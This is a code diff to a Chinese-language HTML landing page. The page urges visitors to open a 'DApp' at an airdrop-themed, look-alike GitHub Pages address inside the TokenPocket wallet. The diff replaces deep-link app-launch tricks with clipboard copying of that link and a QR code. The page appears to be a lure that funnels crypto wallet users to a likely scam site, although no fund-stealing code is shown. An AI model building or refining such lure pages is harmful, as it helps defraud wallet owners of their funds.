@@ -57,10 +57,10 @@
 
     <!-- TP唤醒提示 -->
     <div class="warning" id="tpTip">
-      请点击下方按钮在 TP 钱包中打开 DApp。
+      请点击下方按钮复制 DApp 链接并在 TP 钱包内置浏览器粘贴访问。
     </div>
 
-    <button id="openTPBtn" onclick="openTPButton()">打开 TokenPocket</button>
+    <button id="openTPBtn" onclick="openTPButton()">复制 DApp 链接 & 打开 TP</button>
 
     <div id="walletInfo" style="display:none;">
       <div class="address" id="walletAddress"></div>
@@ -77,7 +77,7 @@
   </div>
 
   <script>
-    const TARGET_URL = "https://airdr0p-888.github.io/GROK1688/index.html";
+    const TARGET_URL = "https://airdr0p-888.github.io/GROK1688/open.html";
 
     /** 判断是否在 TP 内置浏览器 */
     function isTPBrowser() {
@@ -115,45 +115,28 @@
       }
     }
 
-    /** 多方案唤醒 TP 并尝试带入目标 URL */
-    function openTPRobust(url) {
-      const encoded = encodeURIComponent(url);
-      const schemes = [
-        `tpdapp://open?url=${encoded}`,
-        `tp://dapp?url=${encoded}`
-      ];
-
-      if (isTPBrowser()) {
-        try { location.replace(url); return; } catch(e) { location.href = url; return; }
+    /** 点击按钮：复制链接并显示二维码 */
+    function openTPButton() {
+      // 复制到剪贴板
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(TARGET_URL).then(() => {
+          alert("DApp 链接已复制到剪贴板！\n请打开 TP 钱包内置浏览器并粘贴访问。");
+        }).catch(() => {
+          alert("请手动复制以下链接访问 DApp：\n" + TARGET_URL);
+        });
+      } else {
+        // 兼容老浏览器
+        const tempInput = document.createElement("input");
+        tempInput.value = TARGET_URL;
+        document.body.appendChild(tempInput);
+        tempInput.select();
+        document.execCommand("copy");
+        document.body.removeChild(tempInput);
+        alert("DApp 链接已复制到剪贴板！\n请打开 TP 钱包内置浏览器并粘贴访问。");
       }
 
-      // 尝试 scheme 1
-      window.location.href = schemes[0];
-
-      // iframe 技巧尝试（安卓兼容）
-      setTimeout(() => {
-        try {
-          const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          iframe.src = schemes[0];
-          document.body.appendChild(iframe);
-          setTimeout(() => { document.body.removeChild(iframe); }, 2000);
-        } catch (e) {}
-      }, 300);
-
-      // 备用 scheme
-      setTimeout(() => { window.location.href = schemes[1]; }, 2000);
-
-      // 若仍无响应，显示二维码
-      setTimeout(() => { showQRCode(url); }, 3500);
-
-      // 10 秒后显示下载提示（如果用户没有 TP）
-      setTimeout(() => { showQRCode(url); }, 10000);
-    }
-
-    /** 绑定按钮 */
-    function openTPButton() {
-      openTPRobust(TARGET_URL);
+      // 显示二维码作为备用
+      showQRCode(TARGET_URL);
     }
 
     /** 页面加载隐藏按钮/提示（如果已在 TP 内） */
